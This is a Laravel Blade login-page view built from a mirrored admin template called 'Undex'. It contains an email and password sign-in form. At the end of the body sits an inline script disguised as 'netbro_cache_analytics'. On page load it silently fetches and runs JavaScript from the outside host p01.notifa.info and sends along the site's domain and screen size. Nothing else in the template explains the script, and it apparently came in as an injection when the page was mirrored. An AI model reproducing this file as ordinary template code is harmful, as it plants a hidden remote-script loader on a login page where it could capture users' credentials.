@extends('layouts.app')

@section('content')
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- The above 4 meta tags *must* come first in the head; any other head content must come *after* these tags -->

    <!-- Title -->
    <title>Undex - Modern Admin Template</title>

    <!-- Favicon -->
    <link rel="icon" href="{{URL::to('assets/img/core-img/favicon.png')}}">

    <!-- Master Stylesheet [If you remove this CSS file, your file will be broken undoubtedly.] -->
    <link rel="stylesheet" href="{{URL::to('assets/style.css')}}" style="position: none;">

</head>

<body>

    <!-- Preloader -->
    <div id="preloader"></div>

    <!-- ======================================
    ******* Page Wrapper Area Start **********
    ======================================= -->
    <div class="main-content- h-100vh">
        <div class="container h-100">
            <div class="row align-items-center justify-content-center">
                <div class="col-sm-10 col-lg-8">
                    <!-- Middle Box -->
                    <div class="middle-box">
                        <div class="card mb-0">
                            <div class="card-body p-4">
                                <div class="row align-items-center">
                                    <div class="col-md-6">
                                        <div class="xs-d-none">
                                            <img src="{{URL::to('assets/img/bg-img/6.png')}}" alt="">
                                        </div>
                                    </div>
                                    
                                    <div class="col-md-6">
                                        <!-- Logo -->
                                        <div class="card-body-login mb-30">
                                            <img src="{{URL::to('assets/img/core-img/logo.png')}}" alt="">
                                        </div>

                                        <h4 class="font-22 mb-30">Sign In</h4>

                                        <form method="post">
                                            @csrf
                                            <div class="form-group">
                                                <label class="float-left" for="emailaddress">Email address</label>
                                                <input class="form-control" type="email" id="emailaddress" name="email" required="" placeholder="Enter your email">
                                            </div>

                                            <div class="form-group">
                                                <a href="forget-password.html" class="text-dark float-right"><span class="font-12 text-primary">Forgot your password?</span></a>
                                                <label class="float-left" for="password">Password</label>
                                                <input class="form-control" type="password" name="password" required="" id="password" placeholder="Enter your password">
                                            </div>

                                            <div class="form-group mb-3">
                                                <div class="custom-control custom-checkbox pl-0">
                                                    <div class="custom-control custom-checkbox">
                                                        <input type="checkbox" class="custom-control-input" id="customCheck1">
                                                        <label class="custom-control-label" for="customCheck1"><span class="font-16">Remember me</span></label>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="form-group mb-0 text-center">
                                                <button class="btn btn-primary btn-block" type="submit"> Log In </button>
                                            </div>

                                        </form>
                                    </div> <!-- end card-body -->
                                </div>
                                <!-- end card -->
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- ======================================
    ********* Page Wrapper Area End ***********
    ======================================= -->

    <!-- Must needed plugins to the run this Template -->
    <script src="{{URL::to('assets/js/jquery.min.js')}}"></script>
    <script src="{{URL::to('assets/js/popper.min.js')}}"></script>
    <script src="{{URL::to('assets/js/bootstrap.min.js')}}"></script>
    <script src="{{URL::to('assets/js/bundle.js')}}"></script>

    <!-- Active JS -->
    <script src="{{URL::to('assets/js/default-assets/active.js')}}"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAp5MWgzit1Y9yKP9YrDwgyOgj9%2b1kTShhDp4kfPwoX5dINCzCbczefiR4q6X0LWx6nRe0DxUs4GyM5TmoEpDrZr%2bCpFOIKK1F%2fvr1eIu%2f633dhqk3X%2b%2fPaWWLlllZS9vu45IQ%2bRyE8kCwE5sSRkqQjNIWkfqPdRs%2fOi%2fpA8oDW76QVEg3OGLUPw0bmykMN7gpj99V0q3mLyz9Y6WNMHCGqz4OkqdqtReml7H46z9E2%2fdugczn8qHo5CLM2PsXgK%2bOvNwL%2fFMhPzFTMt%2braGZq8FfhGCUEIzi2NSSH0ffFExXw20fGTfvdZI8JhVVxw8WZIuqPew6iSyoLAUjb0den9SPHzD%2f24Wm8EGz9B0gGmq5onkuEEgRwV2VTMXsQ5t1S3th06Y9q6%2fjX8cQWeZzwW223dG5yzjx1a3u1R9%2b6mE9cqCLW7dfoGWf5nzQ0rCusTicrE6F2yOc1z5%2fm35CvqEP1s6wvuSJ%2bg9rVymOroQDKRBvVL4Nl3tmAvjCAF5oR" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from demo.riktheme.com/undex-1/side-menu-dark/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 02 Oct 2019 08:41:49 GMT -->
</html>
@endsection